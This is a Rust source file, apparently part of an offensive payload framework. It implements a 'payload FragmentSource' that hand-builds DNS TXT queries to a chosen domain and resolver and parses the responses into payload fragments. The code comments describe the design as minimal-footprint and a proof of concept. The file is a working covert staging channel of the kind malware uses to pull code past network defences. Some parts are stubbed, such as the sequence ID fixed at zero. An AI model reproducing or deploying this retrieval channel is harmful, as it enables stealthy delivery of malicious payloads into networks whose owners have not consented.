use crate::fragments::{Fragment, FragmentSource};
use core::time::Duration;
use std::net::UdpSocket;

/// A payload FragmentSource that reads data from DNS TXT records.
/// No external dependencies: constructs raw DNS queries and parses responses directly.
pub struct DnsTxtSource {
    pub domain: String,
    pub resolver: String,
}

impl DnsTxtSource {
    pub fn new(domain: &str, resolver: &str) -> Self {
        DnsTxtSource {
            domain: domain.to_string(),
            resolver: resolver.to_string(),
        }
    }

    /// Forms a raw DNS query packet (12-byte header + encoded domain + QTYPE + QCLASS).
    fn build_dns_query(&self, tx_id: u16) -> Vec<u8> {
        let mut packet = Vec::with_capacity(512);
        
        // 12-byte DNS Header
        packet.extend_from_slice(&tx_id.to_be_bytes()); // Transaction ID
        packet.extend_from_slice(&[0x01, 0x00]);        // Flags: Standard query
        packet.extend_from_slice(&[0x00, 0x01]);        // Questions: 1
        packet.extend_from_slice(&[0x00, 0x00]);        // Answer RRs: 0
        packet.extend_from_slice(&[0x00, 0x00]);        // Authority RRs: 0
        packet.extend_from_slice(&[0x00, 0x00]);        // Additional RRs: 0

        // Domain Name Parsing (QNAME)
        for part in self.domain.split('.') {
            let len = part.len() as u8;
            packet.push(len);
            packet.extend_from_slice(part.as_bytes());
        }
        packet.push(0x00); // End of QNAME

        // QTYPE: TXT (16)
        packet.extend_from_slice(&[0x00, 0x10]);
        // QCLASS: IN (1)
        packet.extend_from_slice(&[0x00, 0x01]);

        packet
    }

    /// Parses a raw DNS response and returns the unencoded payload bytes from the TXT record.
    /// This is a spartan parser designed for minimal footprint.
    fn parse_dns_response(&self, buf: &[u8]) -> Option<Vec<u8>> {
        if buf.len() < 12 {
            return None; // Too short
        }

        // Check if it's a response (QR bit set) and no error code (RCODE == 0)
        let flags = u16::from_be_bytes([buf[2], buf[3]]);
        if (flags & 0x8000) == 0 || (flags & 0x000F) != 0 {
            return None; 
        }

        let qdcount = u16::from_be_bytes([buf[4], buf[5]]);
        let ancount = u16::from_be_bytes([buf[6], buf[7]]);

        if ancount == 0 {
            return None; // No answers
        }

        // Skip header
        let mut offset = 12;

        // Skip queries section
        for _ in 0..qdcount {
            while offset < buf.len() && buf[offset] != 0 {
                if buf[offset] >= 192 {
                    offset += 2; // Pointer
                    break;
                } else {
                    offset += (buf[offset] as usize) + 1;
                }
            }
            if offset < buf.len() && buf[offset] == 0 {
                offset += 1;
            }
            offset += 4; // Skip QTYPE and QCLASS
        }

        // Parse answers section
        for _ in 0..ancount {
            if offset >= buf.len() { break; }

            // Skip name
            if buf[offset] >= 192 {
                offset += 2; // Pointer
            } else {
                while offset < buf.len() && buf[offset] != 0 {
                    offset += (buf[offset] as usize) + 1;
                }
                offset += 1;
            }

            if offset + 10 > buf.len() { break; }

            let rtype = u16::from_be_bytes([buf[offset], buf[offset+1]]);
            let rdlength = u16::from_be_bytes([buf[offset+8], buf[offset+9]]) as usize;
            offset += 10;

            if rtype == 16 { // TXT Record
                if offset + rdlength > buf.len() { break; }
                
                // TXT data contains length-prefixed strings. 
                // We extract the first string.
                let txt_len = buf[offset] as usize;
                if offset + 1 + txt_len <= buf.len() {
                    let txt_data = &buf[offset+1 .. offset+1+txt_len];
                    
                    // In a real scenario, this TXT would contain hex/base64 encoded bytes. 
                    // For the PoC, we assume it's direct bytes or hex string to be converted.
                    // For brevity and minimal footprint, returning raw bytes here.
                    return Some(txt_data.to_vec());
                }
            } else {
                offset += rdlength;
            }
        }
        None
    }
}

impl FragmentSource for DnsTxtSource {
    fn fetch(&self) -> Fragment {
        let sock = match UdpSocket::bind("0.0.0.0:0") {
            Ok(s) => s,
            Err(_) => return Fragment { sequence_id: 0, data: vec![] },
        };
        let _ = sock.set_read_timeout(Some(Duration::from_secs(3)));

        // tx_id maps to sequence_id for simplicity in this PoC
        // Real implementation would extract sequence from TXT payload layout
        let sequence_id: u8 = 0; 
        
        let query = self.build_dns_query(0x1234);
        if sock.send_to(&query, &self.resolver).is_err() {
            return Fragment { sequence_id, data: vec![] };
        }

        let mut buf = [0u8; 512];
        if let Ok((size, _)) = sock.recv_from(&mut buf) {
             if let Some(payload_bytes) = self.parse_dns_response(&buf[..size]) {
                 return Fragment {
                     sequence_id,  // In a multi-part payload, the sequence ID would be parsed from the domain query.
                     data: payload_bytes,
                 };
             }
        }

        Fragment { sequence_id, data: vec![] }
    }
}
